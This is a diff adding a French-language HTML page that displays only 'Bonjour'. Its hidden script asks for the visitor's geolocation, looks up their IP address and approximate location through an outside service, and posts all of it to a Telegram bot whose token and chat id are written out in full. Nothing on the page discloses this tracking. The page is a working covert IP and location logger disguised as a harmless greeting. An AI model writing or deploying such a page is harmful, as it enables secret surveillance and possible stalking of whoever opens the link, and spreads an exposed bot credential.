@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bonjour</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            font-size: 48px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Bonjour</h1>
+
+<script>
+    // Fonction pour envoyer des données au bot Telegram
+    function sendToTelegram(message) {
+        var botToken = '7513470387:AAFoEffP7ZPzXdOB_OxrWKVHtQWfbAINgd8'; // Remplace avec le token de ton bot
+        var chatId = '6798922432'; // Remplace avec ton chat_id
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        }).then(response => {
+            if (response.ok) {
+                console.log('Message envoyé avec succès.');
+            } else {
+                console.error('Erreur lors de l\'envoi.');
+            }
+        }).catch(error => {
+            console.error('Erreur:', error);
+        });
+    }
+
+    // Obtenir la géolocalisation
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var locationMessage = `Position: Latitude: ${latitude}, Longitude: ${longitude}`;
+
+            // Envoyer la position au bot Telegram
+            sendToTelegram(locationMessage);
+        }, function(error) {
+            console.error('Erreur de géolocalisation:', error);
+            sendToTelegram('Géolocalisation refusée ou indisponible.');
+        });
+    } else {
+        sendToTelegram('Géolocalisation non supportée.');
+    }
+
+    // Obtenir l'adresse IP via un service externe
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            var ipMessage = `IP: ${data.ip}, Localisation approximative: ${data.city}, ${data.region}, ${data.country}`;
+            
+            // Envoyer l'IP et la localisation au bot Telegram
+            sendToTelegram(ipMessage);
+        })
+        .catch(error => {
+            console.error('Erreur lors de la récupération de l\'IP:', error);
+            sendToTelegram('Impossible de récupérer l\'IP.');
+        });
+
+</script>
+
+</body>
+</html>
